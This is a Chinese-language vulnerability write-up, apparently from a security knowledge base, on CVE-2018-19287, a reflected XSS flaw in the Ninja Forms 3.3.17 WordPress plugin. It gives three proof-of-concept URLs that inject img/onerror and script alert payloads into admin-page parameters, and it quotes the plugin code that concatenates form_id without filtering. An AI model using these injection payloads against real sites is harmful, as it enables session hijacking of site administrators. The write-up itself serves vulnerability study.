<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="Xf5b04fceeb96c0a6fa8348c72e4205ef3663308"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-19287</span><span class="csECDA2D3">）</span><span class="csDE05BCC">WordPress Plugin - Ninja Forms 3.3.17 XSS</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Ninja Forms</span><span class="cs9C1B1871">是</span><span class="cs8926E06">WordPress</span><span class="cs9C1B1871">的终极免费表单创建工具。使用简单但功能强大的拖放式表单创建器在几分钟内构建表单。对于初学者，可以快速轻松地设计复杂的表单，绝对没有代码。对于开发人员，利用内置的钩子，过滤器，甚至自定义字段模板，使用</span><span class="cs8926E06">Ninja Forms</span><span class="cs9C1B1871">作为框架，在表单构建或提交的任何步骤中执行您需要的任何操作。</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">下面是我从</span><span class="cs8926E06">exploit-db</span><span class="cs9C1B1871">上复制的</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">，为了方便判断，修改了弹窗的内容。</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/wp-admin/edit.php?s&amp;post_status=all&amp;post_type=nf_sub&amp;action=-1&amp;form_id=1&amp;nf_form_filter&amp;begin_date&amp;end_date=&quot;&gt;&lt;img+src=mtk+onerror=alert(/POC1/);//&amp;filter_action=Filter&amp;paged=1&amp;action2=-1</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/wp-admin/edit.php?s&amp;post_status=all&amp;post_type=nf_sub&amp;action=-1&amp;form_id=1&amp;nf_form_filter&amp;begin_date=&quot;&gt;&lt;img+src=mtk+onerror=alert(/POC2/);//&amp;end_date&amp;filter_action=Filter&amp;paged=1&amp;action2=-1</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/wp-admin/edit.php?post_status=trash&amp;post_type=nf_sub&amp;form_id=1&quot;&gt;&lt;script&gt;alert(/POC3/);&lt;/script&gt;&amp;nf_form_filter&amp;paged=1</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们只要直接复制</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">到浏览器的地址栏回车即可触发漏洞。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">下图是触发第一个</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">的图：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Wordpress/Wordpress_插件漏洞/%ef%bc%88CVE-2018-19287%ef%bc%89WordPress%20Plugin%20-%20Ninja%20Forms%203.3.17%20XSS_files/image0.png" width="560" height="315" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">下图是触发第二个</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">的图：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Wordpress/Wordpress_插件漏洞/%ef%bc%88CVE-2018-19287%ef%bc%89WordPress%20Plugin%20-%20Ninja%20Forms%203.3.17%20XSS_files/image1.png" width="560" height="315" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">下图是触发第三个</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">的图：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Wordpress/Wordpress_插件漏洞/%ef%bc%88CVE-2018-19287%ef%bc%89WordPress%20Plugin%20-%20Ninja%20Forms%203.3.17%20XSS_files/image2.png" width="560" height="315" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="漏洞分析过程"><span class="csD6CA00D2">漏洞分析过程</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">笔者直接从</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">方面入手，简单分析一下漏洞的成因。由于方法是一样的，笔者是一个懒人，这里就只分析了</span><span class="cs8926E06">POC3</span><span class="cs9C1B1871">的成因。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">查找关键词</span><span class="cs8926E06">nf_sub</span><span class="cs9C1B1871">，确定了核心文件</span><span class="cs8926E06">\wp-content\plugins\ninja-forms\includes\Admin\Menus\Submissions.php</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">下图是</span><span class="cs8926E06">Submissions.php</span><span class="cs9C1B1871">部分内容：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Wordpress/Wordpress_插件漏洞/%ef%bc%88CVE-2018-19287%ef%bc%89WordPress%20Plugin%20-%20Ninja%20Forms%203.3.17%20XSS_files/image3.png" width="560" height="372" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过粗略的阅读，发现这个函数是导致</span><span class="cs8926E06">POC3</span><span class="cs9C1B1871">成功弹窗的关键。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">下图是</span><span class="cs8926E06">Submissions.php</span><span class="cs9C1B1871">文件第</span><span class="cs8926E06">71-104</span><span class="cs9C1B1871">行内容：</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function change_views( $views )</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// Remove our unused views.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unset( $views[ &#39;mine&#39; ] );</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unset( $views[ &#39;publish&#39; ] );</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// If the Form ID is not empty...</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if( ! empty( $_GET[ &#39;form_id&#39; ] ) ) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// ...populate the rest of the query string.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$form_id = &#39;&amp;form_id=&#39; . $_GET[ &#39;form_id&#39; ] . &#39;&amp;nf_form_filter&amp;paged=1&#39;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// ...otherwise send in an empty string.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$form_id = &#39;&#39;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// Build our new views.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$views[ &#39;all&#39; ] = &#39;&lt;a href=&quot;&#39; . admin_url( &#39;edit.php?post_status=all&amp;post_type=nf_sub&#39; &nbsp;) . $form_id . &#39;&quot;&gt;&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;. __( &#39;Completed&#39;, &#39;ninja-forms&#39; ) . &#39;&lt;/a&gt;&#39;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$views[ &#39;trash&#39; ] = &#39;&lt;a href=&quot;&#39; . admin_url( &#39;edit.php?post_status=trash&amp;post_type=nf_sub&#39; ) . $form_id . &#39;&quot;&gt;&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;. __( &#39;Trashed&#39;, &#39;ninja-forms&#39; ) . &#39;&lt;/a&gt;&#39;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// Checks to make sure we have a post status.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if( ! empty( $_GET[ &#39;post_status&#39; ] ) ) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Depending on the domain set the value to plain text.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( &#39;all&#39; == $_GET[ &#39;post_status&#39; ] ) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$views[ &#39;all&#39; ] = __( &#39;Completed&#39;, &#39;ninja-forms&#39; );</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else if ( &#39;trash&#39; == $_GET[ &#39;post_status&#39; ] ) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$views[ &#39;trash&#39; ] = __( &#39;Trashed&#39;, &#39;ninja-forms&#39; );</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $views;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从上面代码，我们可以看到，</span><span class="cs8926E06">form_id</span><span class="cs9C1B1871">并没有被过滤，导致</span><span class="cs8926E06">XSS</span><span class="cs9C1B1871">存在。</span></p><p class="cs3A447A38"><span class="cs9FB05234">$form_id = &#39;&amp;form_id=&#39; . $_GET[ &#39;form_id&#39; ] . &#39;&amp;nf_form_filter&amp;paged=1&#39;;</span></p><h2 class="cs868C439D">
			<a name="四、参考链接"><span class="cs83F14626">四、参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://www.exploit-db.com/exploits/45880/"><span class="cs4B51D5E4">https://www.exploit-db.com/exploits/45880/</span></a></span></p><p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://www.freebuf.com/vuls/190411.html"><span class="cs4B51D5E4">https://www.freebuf.com/vuls/190411.html</span></a></span></p></body>
</html>
